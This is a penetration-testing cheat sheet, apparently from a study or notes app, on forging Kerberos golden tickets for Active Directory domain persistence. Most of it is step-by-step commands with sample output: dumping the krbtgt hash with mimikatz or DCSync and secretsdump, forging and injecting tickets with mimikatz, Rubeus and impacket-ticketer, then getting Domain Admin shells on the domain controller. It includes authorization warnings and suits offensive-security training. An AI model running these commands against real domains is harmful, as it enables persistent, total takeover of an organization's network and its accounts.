title: Golden Ticket — Forge TGTs with the krbtgt Hash (Domain Persistence)
body:
The KDC encrypts every TGT with the krbtgt account's password hash. If you steal krbtgt's hash, you can forge your OWN TGTs for ANY user with ANY group membership — and the DC will trust them because they're correctly encrypted. That's a golden ticket: arbitrary, self-minted domain-admin access that persists.

GOLDEN vs SILVER:
  - Silver ticket = forge a TGS for ONE service (needs that service account's hash). Limited.
  - Golden ticket = forge a TGT (needs krbtgt's hash). Access to the ENTIRE domain.

WHY IT'S PERSISTENCE GOLD:
  - krbtgt's password is almost NEVER rotated. It only changes on a domain functional-level upgrade from pre-2008 — so old krbtgt hashes survive for years.
  - Forging + injecting needs NO admin rights and can be done from a non-domain-joined box. You only needed admin ONCE, to grab the krbtgt hash.
  - You can make a low-priv user (or any existing account) a Domain Admin in the forged ticket.

PREREQUISITE — you must already own the domain to plant this:
  Getting krbtgt's hash requires DA-level access first (DCSync, or dumping NTDS on the DC). Golden ticket is what you do AFTER popping the domain to KEEP access, not how you get in. It's a persistence/dominance technique.

POST-JULY-2022 CHANGE:
  Microsoft tightened things — the /user you forge must now be an EXISTING account. Before, any made-up name worked. Use a real account (e.g. jen).

KERBEROS GOTCHA (same as PsExec): after injecting the ticket, PsExec to the DC by HOSTNAME (\\DC1), not IP — IP forces NTLM and the forged Kerberos ticket won't apply.

Real-engagement caution: a golden ticket is total domain compromise that survives password changes. Get explicit written client permission before planting one; many engagements scope persistence OUT entirely.
cmd:
# ══════════════════════════════════════════════════
# STEP 1 — get krbtgt's NTLM hash (requires DA already)
# ══════════════════════════════════════════════════
# On the DC, or via DCSync from a DA-equivalent account:
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch
#   ... RID 502 User: krbtgt  NTLM: 1693c6cefafffc7af11ef34d1c788f47
# Also grab the domain SID (whoami /user, or from the dump).

# DCSync alternative (from any DA-equivalent box, no DC login):
mimikatz # lsadump::dcsync /user:krbtgt
# or impacket:  impacket-secretsdump corp.com/da_user@dc1 -just-dc-user krbtgt

# ══════════════════════════════════════════════════
# STEP 1b — get the DOMAIN SID (needed for /sid:)
# ══════════════════════════════════════════════════
# The golden ticket needs the DOMAIN sid (no trailing RID).
impacket-lookupsid corp.com/jeffadmin:'<pw>'@<DC>
#   -> Domain SID is: S-1-5-21-1987370270-658905905-1781884369
# (or read it off any user SID from a dump and strip the -<RID> suffix)

# ══════════════════════════════════════════════════
# STEP 2 — purge, then forge + inject the golden ticket
# ══════════════════════════════════════════════════
mimikatz # kerberos::purge       # clear existing tickets first
mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
#   /user   an EXISTING account (post-2022 requirement)
#   /sid    the DOMAIN sid (no trailing RID)
#   /krbtgt krbtgt's NTLM hash (NOT /rc4)
#   /ptt    pass-the-ticket: inject straight into this session
# Defaults bake in RID 500 + Domain Admins/Enterprise Admins group membership.

# ══════════════════════════════════════════════════
# STEP 3 — use it (hostname, not IP)
# ══════════════════════════════════════════════════
mimikatz # misc::cmd             # spawn a cmd that can see the ticket
C:\Tools\SysinternalsSuite> PsExec.exe \\DC1 cmd.exe     # HOSTNAME -> Kerberos
# whoami        -> corp\jen
# whoami /groups -> includes CORP\Domain Admins, Enterprise Admins, Schema Admins

# Contrast — IP forces NTLM and is denied even with the golden ticket:
#   PsExec.exe \\192.168.50.70 cmd.exe   -> Access is denied

# ══════════════════════════════════════════════════
# FROM KALI — impacket
# ══════════════════════════════════════════════════
impacket-ticketer -nthash 1693c6cefafffc7af11ef34d1c788f47 -domain-sid S-1-5-21-1987370270-658905905-1781884369 -domain corp.com jen
export KRB5CCNAME=jen.ccache
impacket-psexec -k -no-pass corp.com/jen@dc1.corp.com


# ══════════════════════════════════════════════════
# RUBEUS PATH — golden without admin, from a user shell
# ══════════════════════════════════════════════════
# Mimikatz kerberos::golden needs an elevated terminal; Rubeus golden
# does NOT — it injects into the current logon session. Use this on a
# non-elevated foothold (e.g. jen on a client).
#
# Rubeus golden takes the krbtgt AES256 key (or /rc4). secretsdump prints
# BOTH the NT hash and the AES256 — pick the one your tool wants:
#   Mimikatz /krbtgt:  -> krbtgt NT hash   (e.g. 1693c6ce...)
#   Rubeus   /aes256:  -> krbtgt AES256    (e.g. e1cced9c...)

# Get krbtgt's keys (DA required — you already own the domain):
impacket-secretsdump -just-dc-user krbtgt corp.com/jeffadmin:'<pw>'@<DC>
#   krbtgt:502:...:1693c6cefafffc7af11ef34d1c788f47:::         <- NT hash
#   krbtgt:aes256-cts-...:e1cced9c6ef723837ff55e373d971633...  <- AES256

# Forge + inject (TYPE THIS BY HAND — see warning on quotes):
klist purge
.\Rubeus.exe golden /aes256:e1cced9c6ef723837ff55e373d971633afb8af8871059f3451ce4bccfcca3d4c /domain:corp.com /sid:<DOMAIN-SID> /user:Administrator /ptt
#   [+] Ticket successfully imported!
klist                       # shows Administrator@CORP.COM krbtgt TGT, AES-256
dir \\dc1\c$               # by NAME — proves DA-level DC access

# ══════════════════════════════════════════════════
# FROM KALI — forge a DA ticket with getTGT (no Rubeus)
# ══════════════════════════════════════════════════
# If you have the Administrator (or any DA) NT hash, just request a TGT:
impacket-getTGT -dc-ip <DC> -hashes :<Admin_NThash> corp.com/administrator
export KRB5CCNAME=administrator.ccache
impacket-wmiexec -k -no-pass -dc-ip <DC> -target-ip <DC> corp.com/administrator@DC1.corp.com

# ══════════════════════════════════════════════════
# WHY 'golden' DUMPS THE HELP TEXT INSTEAD OF RUNNING
# ══════════════════════════════════════════════════
# 1. Smart quotes. Pasting from notes/PDF brings curly “ ” instead of " ".
#    Rubeus rejects the arg and prints usage. Re-type the line by hand.
# 2. Wrong key. golden needs the KRBTGT key, not a user's. A normal user's
#    AES/RC4 is invalid here -> if you only have a user hash you want
#    'asktgt' (overpass), not 'golden'.
# 3. Build support. Some Rubeus builds gate /aes256 on golden — run
#    '.\Rubeus.exe golden' bare and read which key flags YOUR build lists;
#    fall back to /rc4:<krbtgt_NThash> if needed.
warn: A golden ticket is total, persistent domain compromise that survives user password changes (only a krbtgt reset kills it). This is a persistence technique requiring you ALREADY have DA to plant it — not an entry vector. On real engagements get explicit written authorization; persistence is often out of scope. Lab-only without it.

choices.label: How do I get krbtgt's hash? — DCSync
Or dump it from NTDS — shadow copy
Forge a single-service ticket instead — silver ticket
Use the ticket — PsExec to the DC
Have a user hash, not krbtgt — overpass-the-hash
Rubeus dumping help, not forging — why?
Only have a USER hash, not krbtgt — overpass instead
